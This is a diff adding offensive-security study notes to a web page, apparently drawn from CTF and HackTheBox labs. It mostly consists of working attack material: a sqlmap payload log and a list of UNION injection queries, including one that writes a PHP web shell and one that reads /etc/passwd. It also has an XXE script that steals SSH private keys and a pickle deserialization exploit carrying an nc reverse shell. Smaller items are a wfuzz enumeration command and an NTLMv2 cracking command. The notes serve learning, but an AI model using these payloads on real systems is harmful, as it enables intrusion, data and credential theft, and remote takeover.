@@ -1693,6 +1693,10 @@ requested url in the parameter is forwarded, so you can replace localhost with 1
 
 however remember that in real life scenarios you will not get informative errors like if there is blacklist you will get 
 "External stock check blocked for security reasions" or for the domain to not be localhost you will not get informative error like "admin interface only available if loggedin as an administrator or if requested from loopback" so we have to figure these errors by intuition or it might be whitelist saying somwthing like "Externakl host must be stock.someweb.com" which in real case scenarios will not say it but whitelist will wxists so you will need to bypass the whitelist with something like http://localhost#@stock.someweb.com and encode # two times to be something like http://localhost%25%32%33stock.weliketoshop.net/ some times we have open redirect where the first we take the first url like/ stockapi=/product/nextproduct?currentproductid=4 then we paste it in the browser with the original domain to get another parameter like ..&path=http://.. which this parameter might be vuln to SSRF
+
+to enumerate for vhosts
+
+wfuzz -u 'http://nahamstore.thm/stockcheck' -c -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -X POST -d 'product_id=2&server=stock.nahamstore.thm@FUZZ.nahamstore.thm#'
 ------------------------------------------------------------------------------------------------------------
 
 
@@ -1709,6 +1713,261 @@ to 127.0.0.1 and in burpsuite under Tools > proxy he added 127.0.0.1:8081 in the
 
     </code></pre>
 </div>
+
+
+
+<div class="github-dark">
+    <pre><code>
+-------------------[XSS]------------------------------
+xss - enables you to steal the cookie and access as admin
+
+appended/hidden xss = search for any input that get appended into the html specially into a tags you have to always ask your self when there is input, WHERE MY INPUT GOES ? and inspect the source code
+converted into html = search for a place where you can input html tags
+xss parameter = search for vulnerable parameter
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-------------------[smb relay]--------------------------------
+what i understrand from the smb relay attack is that, normally there is a file share server and clients, the client once will typo the share name he will not get it so he will start asking who has this share ?? using LLMNR or NBT-NS as a resolution discovery without the need of DNS so here we come and say yes i have this share, the client will believe us we will ask them to authenticate etc we will make him do the normal process here while we will forward it to the main server i was questioning that since the share name from the beginning is wrong it means we won't authenticate anyway even if we are MITM, but what i understood is that the authentication process by itself is enough for us to list the shares in the sharing server so eventhough we will get rejected but we will be authenticated ! which is what we want to list the shares and the "share doesn't exists error we will send it to the client" so next time you typo the share name you should pull your hair out because you won't feel it while there might be an attacker who forwarded the "share does't exist error for you :) and that is why mitigating it by disabling LLMNR and NBT-NS which will make the client not ask 'who has this share' thus the attacker can't know if there is any client missing to find a share or vlan client isolation to lower the possibility of someone sniffing on clients asking of typo shares 
+
+if you got the NTLMv2 hash crack it baby hashcat -m 5600 hash.txt password_List.txt -o cracked.txt
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-------------------[SQLmap inline proxy]--------------------------------
+[boolean-based blind] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+POST /product?id=1) AND 8396=7356 AND (4412=4412 HTTP/1.1
+[10:58:14] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
+
+[Generic inline queries] [INFO] testing 'Generic inline queries'
+POST /product?id=(SELECT CONCAT(CONCAT(0x71706b7671,(CASE WHEN (3575=3575) THEN 0x31 ELSE 0x30 END)),0x717a7a6a71)) HTTP/1.1
+
+[error-based - WHERE, HAVING, ORDER BY or GROUP BY clause] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+POST /product?id=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71706b7671,(SELECT (ELT(6121=6121,1))),0x717a7a6a71,0x78))s), 8446744073709551610, 8446744073709551610))) HTTP/1.1
+
+[OR error-based - WHERE or HAVING clause] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+
+1 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71706b7671,(SELECT (ELT(2167=2167,1))),0x717a7a6a71,0x78))s), 8446744073709551610, 8446744073709551610)))
+
+[AND error-based] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+POST /product?id=1 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x71706b7671,(SELECT (ELT(1416=1416,1))),0x717a7a6a71,0x78))x)) HTTP/1.1
+
+[OR error-based] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+POST /product?id=1 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71706b7671,(SELECT (ELT(2740=2740,1))),0x717a7a6a71,0x78))x)) HTTP/1.1
+
+
+[AND error-based] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+POST /product?id=1 AND GTID_SUBSET(CONCAT(0x71706b7671,(SELECT (ELT(8955=8955,1))),0x717a7a6a71),8955) HTTP/1.1
+
+[query SLEEP] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+
+POST /product?id=1;SELECT SLEEP(5)# HTTP/1.1
+POST /product?id=1;(SELECT * FROM (SELECT(SLEEP(5)))tfXY)# HTTP/1.1
+
+[BENCHMARK] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+
+POST /product?id=1;SELECT BENCHMARK(5000000,MD5(0x567a7258))# HTTP/1.1
+
+[11:12:27] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+
+POST /product?id=1 AND SLEEP(5) HTTP/1.1
+
+[11:13:11] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
+
+POST /product?id=1 OR SLEEP(5)# HTTP/1.1
+
+[11:14:11] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
+
+POST /product?id=1 AND 6389=BENCHMARK(5000000,MD5(0x6b4c4d57)) HTTP/1.1
+
+[11:14:41] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
+
+POST /product?id=1 AND 9943=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) HTTP/1.1
+
+[11:16:47] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
+POST /product?id=1 OR 8580=BENCHMARK(5000000,MD5(0x504d6175))# HTTP/1.1
+
+[11:17:17] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
+
+POST /product?id=1 OR 8023=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)# HTTP/1.1
+
+[11:17:47] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+
+POST /product?id=1 RLIKE SLEEP(5) HTTP/1.1
+
+[11:18:41] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
+POST /product?id=1 RLIKE (SELECT 1587 FROM (SELECT(SLEEP(5)))CJQL) HTTP/1.1
+
+[11:19:25] [INFO] testing 'MySQL AND time-based blind (ELT)'
+
+POST /product?id=1 AND ELT(4808=4808,SLEEP(5)) HTTP/1.1
+
+[11:19:45] [INFO] testing 'MySQL OR time-based blind (ELT)
+POST /product?id=1 OR ELT(3191=3191,SLEEP(5)) HTTP/1.1
+
+[11:20:30] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+
+POST /product?id=1 PROCEDURE ANALYSE(EXTRACTVALUE(9400,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x6450744e))))),1) HTTP/1.1
+
+[11:21:24] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+
+POST /product?id=(CASE WHEN (7994=7994) THEN SLEEP(5) ELSE 7994 END) HTTP/1.1
+
+=-------------[Dumping]--------=
+
+dump all availble databases:
+POST /product?id=-5251 UNION ALL SELECT 77,77,77,CONCAT(0x71706b7671,JSON_ARRAYAGG(SCHEMA_NAME),0x717a7a6a71),77 FROM information_schema.SCHEMATA# HTTP/1.1
+
+To list all the available database's tables:
+POST /product?id=-5251 UNION ALL SELECT 77,77,77,CONCAT(0x71706b7671,JSON_ARRAYAGG(CONCAT_WS(0x767763707578,TABLESPACE_NAME,`ENGINE_ATTRIBUTE`)),0x717a7a6a71),77 FROM information_schema.TABLESPACES_EXTENSIONS# HTTP/1.1
+
+to dump columns inside table:
+POST /product?id=-5251 UNION ALL SELECT 77,77,77,CONCAT(0x71706b7671,JSON_ARRAYAGG(CONCAT_WS(0x767763707578,COLUMN_NAME)),0x717a7a6a71),77 FROM information_schema.COLUMNS WHERE TABLE_NAME='sqli_one' AND TABLE_SCHEMA='nahamstore'# HTTP/1.1
+
+to dump the columns of specific table:
+POST /product?id=-9975 UNION ALL SELECT 77,77,77,CONCAT(0x71706b7671,JSON_ARRAYAGG(CONCAT_WS(0x767763707578,flag,id)),0x717a7a6a71),77 FROM nahamstore.sqli_one# HTTP/1.1
+------------------------------------------------
+
+1. List Tables in a Specific Database:
+?id=-5251 UNION ALL SELECT 77,77,77,CONCAT(0x71706b7671,JSON_ARRAYAGG(TABLE_NAME),0x717a7a6a71),77 FROM information_schema.TABLES WHERE TABLE_SCHEMA='database_name'#
+
+2. Dump Columns in a Specific Table:
+?id=-5251 UNION ALL SELECT 77,77,77,CONCAT(0x71706b7671,JSON_ARRAYAGG(COLUMN_NAME),0x717a7a6a71),77 FROM information_schema.COLUMNS WHERE TABLE_NAME='table_name' AND TABLE_SCHEMA='database_name'#
+
+3. Dump Data from a Table:
+?id=-5251 UNION ALL SELECT 77,77,77,CONCAT(0x71706b7671,JSON_ARRAYAGG(CONCAT_WS(0x767763707578,column1, column2, column3)),0x717a7a6a71),77 FROM database_name.table_name#
+
+4. Check User Privileges:
+?id=-5251 UNION ALL SELECT 77,77,77,CONCAT(0x71706b7671,USER(),0x717a7a6a71),77#
+
+5. Extract MySQL Version:
+?id=-5251 UNION ALL SELECT 77,77,77,CONCAT(0x71706b7671,VERSION(),0x717a7a6a71),77#
+
+6. Get Current Database Name:
+?id=-5251 UNION ALL SELECT 77,77,77,CONCAT(0x71706b7671,DATABASE(),0x717a7a6a71),77#
+
+7. Get User-Defined Variables:
+?id=-5251 UNION ALL SELECT 77,77,77,CONCAT(0x71706b7671,@@GLOBAL.hostname,0x717a7a6a71),77#
+
+8. File-based Injection: Read Files:
+?id=-5251 UNION ALL SELECT 77,77,77,LOAD_FILE('/etc/passwd'),77#
+
+9. Write to a File (Potential Web Shell):
+?id=-5251 UNION ALL SELECT 77,77,77,'<?php system($_GET["cmd"]); ?>',77 INTO OUTFILE '/var/www/html/shell.php'#
+
+10. Brute Force Column Count (Finding Blind Injection Points):
+?id=-5251 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+
+11. Bypass Authentication:
+' OR '1'='1' --
+
+12. Enumerate Users:
+?id=-5251 UNION ALL SELECT 77,77,77,CONCAT(0x71706b7671,JSON_ARRAYAGG(user),0x717a7a6a71),77 FROM mysql.user#
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-------------------[xxe ]--------------------------------
+XXE - enables you to read files 
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-------------------[smb relay]--------------------------------
+rotten potato is like smb relay where the attacker relays the process of authentication untill you get the authentication permission and reject the main side and get with inside with the token
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+
+<div class="github-dark">
+    <pre><code>
+-------------------[ippsec aragog]--------------------------------
+when ippsec had normal xxe on the box he knew that the /etc/passwd can reveal for you the home directories in the box, so he created the script that will first read the /etc/passwd using the xxe, then he filtered for the home directories to get the home directories in the box then he created lists that he wanted to check in every use directory that he can read so the script is:
+
+import requests
+from base64 import b64decode
+
+def GetFile(fname):
+    payload = '&lt;!DOCTYPE replace [&lt;!ENTITY PleaseSubscribe SYSTEM "php://filter/convert.base64-encode/resource=' + fname + '" &gt;]&gt;&lt;details&gt;&lt;subnet_mask&gt;&amp;PleaseSubscribe;&lt;/subnet_mask&gt;&lt;test&gt;&lt;/test&gt;&lt;/details&gt;'
+    resp = requests.post('http://10.10.10.78/hosts.php', data=payload)
+    fcontent = (resp.text).split(' ')[6]
+    fcontent = b64decode(fcontent)
+    return fcontent
+
+def GetHomeDir():
+    homedir = []
+    passwd = GetFile('/etc/passwd')
+    lines = iter(passwd.splitlines())
+    for line in lines:
+        if line.endswith('sh'):
+            line = line.split(':')[5]
+            homedir.append(line)
+    return homedir
+
+for user in GetHomeDir():
+    fh = open('filelist.txt')
+    for line in fh:
+        PleaseSubscribe = GetFile(user + line.rstrip())
+        if PleaseSubscribe:
+            print(user + line.rstrip())
+            print(PleaseSubscribe)
+
+
+then create the filelist.txt with the following paths:
+./bash_history
+/passwords.txt
+/.history
+/.mysql_history
+/.ssh/id_rsa
+
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+
+<div class="github-dark">
+    <pre><code>
+-------------------[ippsec pickle unserialization exploit - DevOps htb]--------------------------------
+import pickle
+from base64 import urlsafe_b64encode as b64encode
+
+RUNME = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 9001 &gt;/tmp/f"""
+
+class PleaseSubscribe(object):
+    def __reduce__(self):
+        import os
+        return (os.system, (RUNME,))
+
+print(b64encode(pickle.dumps(PleaseSubscribe())))
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
 
 <style>.github-dark{color:#e1e4e8;background:#24292e;}.ct-806137{color:#B392F0;}.ct-767297{color:#E1E4E8;}.ct-244866{color:#9ECBFF;}.ct-533739{color:#79B8FF;}.ct-326375{color:#6A737D;}.ct-857441{color:#F97583;}.ct-211346{color:#85E89D;}.ct-657843{color:#FFAB70;}</style></div></article></div><div class="bug-container" data-v-3d677fb4=""><svg id="bug-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="-500 -500 1000 1000" shape-rendering="geometricPrecision" text-rendering="geometricPrecision"><g id="centeredGroup"><g><g id="bug" transform="scale(0.3)" class="no-anim"><g transform="matrix(0 1 1 0 -181 -190)"><g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><path d="M272.925,109.032c0,0,2.559-23.035,20.345-41.841c17.786-18.805,30.24-26.227,38.841-28.59c1.337-.367,6.54,0,8.501,3.634c1.96,3.634,0,8.784-2.694,10.238-8.867,4.783-26.383,16.413-33.997,26.707-8.238,11.14-17.851,29.476-17.051,37.977l-13.945-8.125Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path><g transform="matrix(-1 0 0 1 508.385 0)" clip-rule="evenodd"><path d="M272.925,109.032c0,0,2.559-23.035,20.345-41.841c17.786-18.805,30.24-26.227,38.841-28.59c1.337-.367,6.54,0,8.501,3.634c1.96,3.634,0,8.784-2.694,10.238-8.867,4.783-26.383,16.413-33.997,26.707-8.238,11.14-17.851,29.476-17.051,37.977l-13.945-8.125Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><path d="M254.526,97.911c-35.103,18.394-69.049,34.232-69.049,86.61h138.098c0-52.378-33.945-68.216-69.049-86.61Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(-1 0 0 1 435.535-38.4886)" clip-rule="evenodd"><path d="M220.774,403.471c-62.815-37.555-58.198-88.343-58.198-88.343v-115.076h183.9v115.076c0,0,4.617,50.788-58.198,88.343l-.269-1.022v-58.76l20.108-16.434v-32.545c7.793-2.587,13.421-9.94,13.421-18.598c0-10.814-8.779-19.592-19.592-19.592s-19.592,8.778-19.592,19.592c0,8.847,5.877,16.332,13.937,18.762v27.052l-19.775,17.268v70.735c-5.044,2.543-10.45,5-16.243,7.348v-87.247c8.012-2.459,13.845-9.921,13.845-18.735c0-10.813-8.779-19.592-19.592-19.592s-19.592,8.779-19.592,19.592c0,8.814,5.833,16.276,13.846,18.735v87.247l-.158-.064c-2.771-1.127-5.522-2.304-8.247-3.538-2.593-1.174-5.161-2.401-7.704-3.679l-.135-.067v-63.735l-19.775-14.268v-20.792c7.541-2.726,12.937-9.953,12.937-18.431c0-10.813-8.779-19.591-19.592-19.591s-19.592,8.778-19.592,19.591c0,8.658,5.628,16.012,13.421,18.599v25.953l21.109,14.434v50.76l-.27,1.022Zm33.752-101.852c5.341,0,9.676,4.336,9.676,9.676c0,5.341-4.335,9.677-9.676,9.677-5.34,0-9.676-4.336-9.676-9.677c0-5.34,4.336-9.676,9.676-9.676Zm-48.42-18.592c5.34,0,9.676,4.336,9.676,9.676c0,5.341-4.336,9.677-9.676,9.677-5.341,0-9.676-4.336-9.676-9.677c0-5.34,4.335-9.676,9.676-9.676Zm95.84-16.592c5.341,0,9.677,4.336,9.677,9.677c0,5.34-4.336,9.676-9.677,9.676-5.34,0-9.676-4.336-9.676-9.676c0-5.341,4.336-9.677,9.676-9.677Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="matrix(-.909773 0 0 1 493.319 0)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.794-1.612-1.772-1.612h-28.799c-5.068,0-9.183,3.744-9.183,8.354c0,4.611,4.115,8.354,9.183,8.354h28.799c.978,0,1.772-.722,1.772-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(-.866025-.5-.5 0.866025 609.497791 100.975794)" clip-rule="evenodd"><g id="evygBKlPSqr13_tr" transform="translate(139.737,232.188) rotate(0)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.737,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="matrix(-1 0 0 1 508.385 41.2501)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.722-1.612-1.612-1.612h-29.788c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h29.788c.89,0,1.612-.722,1.612-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(-.707107 0.707107 0.707107 0.707107 310.015271 10.447407)" clip-rule="evenodd"><g id="evygBKlPSqr18_tr" transform="translate(139.737,232.188) rotate(0)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.737,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="matrix(-1 0 0 1 508.385 92.3776)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.722-1.612-1.612-1.612h-29.788c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h29.788c.89,0,1.612-.722,1.612-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(0 1.06393 1 0 140.199 180.854)" clip-rule="evenodd"><path d="M166.979,232.188c0-4.61-3.519-8.354-7.852-8.354h-24.05c-4.334,0-7.852,3.744-7.852,8.354c0,4.611,3.518,8.354,7.852,8.354h24.05c4.333,0,7.852-3.743,7.852-8.354Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(-.866025-.5-.5 0.866025 609.497658 221.785295)" clip-rule="evenodd"><g id="evygBKlPSqr25_tr" transform="translate(139.73775,232.188433) rotate(0)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.73775,-232.188433)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="matrix(.909773 0 0 1 15.066 0)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.794-1.612-1.772-1.612h-28.799c-5.068,0-9.183,3.744-9.183,8.354c0,4.611,4.115,8.354,9.183,8.354h28.799c.978,0,1.772-.722,1.772-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="translate(-3.73987 0)" clip-rule="evenodd"><g id="evygBKlPSqr30_tr" transform="translate(139.737,232.188) rotate(45)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.737,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="translate(0 41.2501)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.722-1.612-1.612-1.612h-29.788c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h29.788c.89,0,1.612-.722,1.612-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(.866025-.5 0.5 0.866025-104.112656 142.225892)" clip-rule="evenodd"><g id="evygBKlPSqr35_tr" transform="translate(139.737,232.188) rotate(0)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.737,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="translate(0 92.3776)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.722-1.612-1.612-1.612h-29.788c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h29.788c.89,0,1.612-.722,1.612-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(0 1.06393-1 0 368.186 180.854)" clip-rule="evenodd"><path d="M166.979,232.188c0-4.61-3.519-8.354-7.852-8.354h-24.05c-4.334,0-7.852,3.744-7.852,8.354c0,4.611,3.518,8.354,7.852,8.354h24.05c4.333,0,7.852-3.743,7.852-8.354Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="translate(-3.73987 120.809)" clip-rule="evenodd"><g id="evygBKlPSqr42_tr" transform="translate(139.737,232.188) rotate(30)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.736996,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g></g><rect id="bug-rect" x="0" width="362" height="380"></rect></g></g><animateMotion dur="30s" repeatCount="indefinite" rotate="auto-reverse" path="M -500 -500 M 500 -500 M -500 500 M 638 646 C 244 99 294 251 237 -148 C 229 -325 -43 -261 -138 -205 C -455 -57 -374 404 64 339 C 355 327 290 -273 -109 -143 C -336 -66 -356 16 -378 106 C -413 252 -319 649 -5 451 C 293 243 -326 155 -145 -36 C -45 -124 431 60 144 222 C -149 368 -258 13 17 -110 C 325 -218 203 200 34 181 C -419 161 37 637 635 649"></animateMotion></g></g></svg></div><!--]--></div></div><div class="cli-container" data-v-3d677fb4="" data-v-159c5976=""><div class="cli-output glow-border" data-v-159c5976="" data-v-3fc3914e=""><button class="close-output-btn glow-border" data-v-3fc3914e=""><img src="N-less%20RSA%20TheStray%CF%80rate_files/close_output.svg" alt="v" data-v-3fc3914e=""></button><div class="output-content hide-content" data-v-3fc3914e=""><span data-v-3fc3914e="">/writeups/ $ </span></div></div><div class="cli-prompt glow-border" data-v-159c5976=""><p data-v-159c5976="">
                 <span style="color: indianred;">root@</span>
